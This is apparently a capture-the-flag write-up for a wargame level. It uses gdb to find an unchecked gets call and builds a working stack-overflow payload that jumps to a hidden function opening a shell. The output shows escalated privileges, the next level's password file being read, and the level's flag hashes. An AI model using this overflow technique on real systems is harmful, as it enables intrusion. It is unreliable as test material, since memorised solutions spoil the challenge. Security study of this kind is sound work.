## Level 1

level1:1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a

All this program does is get the user input using 'gets'.
```
(gdb) disas main
   ...
   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
```

So `gets` is a vulnerable function because it doesn't check bounderies, therefore we exploited it via overwriting the caller's return address.
```
(gdb) r < <(python -c 'print("A"*76+"BBBB")')
...
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

We can see that there's a hidden function called `run` that executes `system("/bin/sh")`
```
(gdb) i func
All defined functions:

Non-debugging symbols:
...
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
...
```
```
(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:     push   ebp
   0x08048445 <+1>:     mov    ebp,esp
   0x08048447 <+3>:     sub    esp,0x18
   0x0804844a <+6>:     mov    eax,ds:0x80497c0
   0x0804844f <+11>:    mov    edx,eax
   0x08048451 <+13>:    mov    eax,0x8048570
   0x08048456 <+18>:    mov    DWORD PTR [esp+0xc],edx
   0x0804845a <+22>:    mov    DWORD PTR [esp+0x8],0x13
   0x08048462 <+30>:    mov    DWORD PTR [esp+0x4],0x1
   0x0804846a <+38>:    mov    DWORD PTR [esp],eax
   0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:    mov    DWORD PTR [esp],0x8048584
   0x08048479 <+53>:    call   0x8048360 <system@plt>
   0x0804847e <+58>:    leave
   0x0804847f <+59>:    ret
End of assembler dump.
```

Now we'll overwrite the previous return address with address of function `run`.
```
~$ (python -c 'print("A"*76+"\x44\x84\x04\x08")'; cat) | ./level1
Good... Wait what?
id
uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```